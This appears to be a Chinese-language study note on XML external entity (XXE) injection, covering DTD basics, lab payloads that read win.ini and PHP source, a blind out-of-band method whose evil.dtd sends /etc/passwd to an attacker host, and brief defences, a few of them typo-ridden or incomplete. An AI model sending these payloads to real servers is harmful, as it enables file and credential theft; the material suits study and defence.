# XXE 外部实体注入

应用解析用户输入的XML数据时,没有禁止外部实体的加载,导致用户可以控制,利用外部实体的声明部分的SYSTEM关键字,导致XML解析器可以从本地⽂件或者远程的URL中读取受保护 的数据或造成、内⽹端⼝扫描、攻击内⽹⽹站等危害



## XML文件

XML（可扩展标记语⾔）就像是⼀种⾼度⾃由的 HTML。HTML ⾥的标签是规定好的，⽽ XML 允许你⾃⼰发明标签来存储和传输数据。   

### 基本格式

- **声明**：`<?xml version="1.0" encoding="UTF-8"?>`（可选，但必须放第一行）
- **文档类型定义**:以 <!DOCTYPE 根元素名 [...]>的形式存在
  - 定义这个XML文档的合法构建模块,比如规定必须包含哪些标签,并且可以在这里**声明实体**
- **根元素**：必须有且仅有一个根标签包裹所有内容。
- **标签**：区分大小写，必须成对闭合（如 `<name>` `</name>`）或自闭合（如 `<img/>`）。
- **属性**：在开始标签中用 `key="value"` 形式添加。
- **注释**：`<!-- 注释 -->`。

```xml
?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE note [
  <!ENTITY author "张三">
]>
<note>
	<to>李四</to>
	<from>&author;</from>
	<heading color="red" priority="high">
		周末聚餐
	</heading>
	<body>
		<![CDATA[
			时间：周六晚 7 
			地点：<随便找个餐厅>
			备注：这⾥的< 和> 不会被当成XML标签解析
        ]]>
</body>
</note>
```



### DTD (文档类型定义)

作用是用于定义XML文档格式的语法规则,定义了文档可以包含哪些元素和属性,以及这些元素和属性在文档中 的结构和顺序

**DTD声明:**指XML文档中声明该文档的DTD或DTD来源部分,分为**内部和外部**



**关键格式**:

- **内部实体**:`<!ENTITY 实体名 "实体值">`

```xml
<!--xml声明-->
<?xml version="1.0" encoding="utf-8" ?>
<!--DTD⽂档类型定义-->
<!DOCTYPE note [
<!ELEMENT note (#PCDATA)>
<!ENTITY to "XXE">
<!ENTITY from "LEARING">
<!ENTITY heading "hello">
<!ENTITY % body "my_friend">
%body
]>
<!-⼀个实体由三部分构成: ⼀个和号 (&), ⼀个实体名称, 以及⼀个分号 (;)-->
<<note>
&to; <!--&to;会被解析为"XXE"-->
&from; <!--&from;会被解析为"LEARING"-->
&heading; <!--&heading;会被解析为"hello"-->
&body; <!--&body;会被解析为空,因为是参数实体%-->
</note>
```

- **外部实体**:`<!ENTITY 实体名 SYSTEM "URI/文件路径">`

```xml
<!ENTITY name SYSTEM "URI/URL">
name
实体的名称
SYSTEM
关键字
URI/URL
是双引号或单引号中包含的外部源的地址
外部实体示例：
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
<!ELEMENT foo >
Shell
<!ENTITY xxe(实体引⽤名) SYSTEM "http://www.exp.com/evil.dtd"(实体内容)>
]>
<foo>&xxe;</foo>
这种写法是从外部引⼊，可以是⼀个URL链接中的⽂件，也可以是本地的⽂件（这也就造成了安全的⻛险）
如上述案例：XML内容被解析后，⽂件内容便通过&xxe被存放在了foo元素中，造成了敏感信息的泄露。
```

外部实体的内容

```dtd
<!ENTITY evil "file:///c:/windows/win.ini" >
```



- **参数实体**:常用于盲XXE,`!ENTITY % 实体名 SYSTEM "URI"`

参数实体专门给后台规则区DTD自己使用的内部变量,前台根本用不了它不认识他

**特征**

- 名字前带一个%
- 定义方法<!NTITY % rule "这是一条后台规则">
- %rule

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!-- 这⾥是后台：定义⼀个参数实体 -->
  <!ENTITY % commonTags "name, age, gender">
  <!-- 在后台内部，直接⽤这个参数实体来拼装另⼀条规则 -->
  <!ELEMENT user (%commonTags;, address)> 
  <!-- 上⾯这⾏会被XML 解析成：<!ELEMENT user (name, age, gender, address)> -->
]>
<!-- 
下⾯是前台
 -->
<user>...</user>
```



## XXE

核心在于DOCTYPE声明,攻击者利用它定义**外部实体**,让XML解析器去读取服务器本地文件或者发起网络请求

**XXE漏洞产生的条件**

- 应用程序接受XML作为输入
- 应用程序使用解析器来解析XML数据
- 应用程序在XML中引用了外部实体
- 应用程序没有对外部实体进行强制性校验和过滤

**危害**:

- 文件读取
- 内网端口扫描
- 攻击内网网站
- 命令执行等



### XXE-有回显

pikachu靶场测试poc

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe "My IS XXE" > ]>
<foo>&xxe;</foo>
```

![image-20260717173102448](https://exllo-lv-github-notes-picture-1452130078.cos.ap-nanjing.myqcloud.com/img/image-20260717173102448.png)

查看文件 

```xml
<?xml version="1.0"?>
<!DOCTYPE a [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" > ]>
<a>&xxe;</a>
```

![image-20260717173623472](https://exllo-lv-github-notes-picture-1452130078.cos.ap-nanjing.myqcloud.com/img/image-20260717173623472.png)

EXP查看文件源码

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=D:/phpStudy/PHPTutorial/WWW/phpinfo.php" > ]>
<foo>&xxe;</foo>
```



> [!CAUTION]
>
> Base64编码可以防止要读取的文件的内容**破坏XML的结构**,且如果是图片,可执行文件压缩包等会直接报错



### XXE-无回显

如果服务器无回显,那只能使用Blind XXE漏洞来构建一条**外带数据(OOB)通道**来读取数据

思路:

1. 客户端发送Payload1 给web服务器
2. web服务器向攻击者服务器获取恶意DTD,并执行文件读取payload2
3. 攻击者服务器返回Payload2 给web服务器
4. web服务器执行Payload2后带着回显结果访问攻击者服务器上特定的FTP或者HTTP
5. 攻击者访问自己的服务器获取结果



#### 详细步骤

**step1:**在VPS上放一个恶意DTD文件evil.dtd内容如下

```dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % send SYSTEM "http://192.168.1.100:8080/?data=%file;">
%send;
```

**step2:**向攻击目标发送以下XML

```xml
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://192.168.1.100/evil.dtd">
  %remote;
]>
<root/>
```



**参数实体嵌套**绕过XML解析器的限制

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://c:/windows/win.ini">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://1.15.136.212:8000?p=%file;'>">
```

用 `%int` 把 `<ENTITY send SYSTEM ...>` 整个作为**字符串**存起来，然后手动调用 `%int;` 让它被解析成有效的实体定义。这个手法叫**参数实体嵌套**。

**实际执行顺序:**

1. 解析器先加载 `%file`，读取 `win.ini`，内容被Base64编码（例如变成 `W2ZvbnRzXQ0K...`）。
2. 解析器加载 `%int`，此时它只是存储了字符串 `<!ENTITY % send SYSTEM 'http://...?p=W2ZvbnRzXQ0K...'>`（注意 `%file` 已经在字符串里被展开）。
3. 调用 `%int;`，解析器把这段字符串**当作新的DTD定义来处理**，于是动态生成了实体 `%send`（注意这是**参数实体**，不是通用实体，因为用的是 `%send`）。
4. 调用 `%send;`，解析器发起HTTP请求：`http://1.15.136.212:8000?p=W2ZvbnRzXQ0K...`
5. 你的VPS（1.15.136.212）监听8000端口的服务收到请求，日志里就能看到Base64编码的 `win.ini` 内容。

> [!CAUTION]
>
> **&#37**必须使用,否则解析器会把 `%send`在定义 `%int`时就展开,导致 `%file`未被替换



## 漏洞挖掘

### 手工

- 关注提交数据的类型,如果是xml格式就可以测试
- 关注数据包的Content-Type值,如果是text/xml过着application/xml就可以关注该数据包
- 还可以尝试修改Content-Type,修改为XML后尝试可否成功

```http
POST /action HTTP/1.0
Content-Type: application/json
Content-Length: 7
{
'foo':'123'
}
```

可替换为:

```http
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52
<?xml version="1.0" encoding="UTF-8"?>
<foo>123</foo>
```



### 自动

**XXEinjection**



## 防御方式

1. 使用开发语言提供的禁用外部实体的方法

```php
libxml_disable_entity_loader(true);
```

```java
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
```

```python
from lxml import etree
```

```xml-dtd
etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

2. 过滤
   关键词<!DOCTYPE 和<!ENTITY ,或者 SYSTEM和PUBLIC
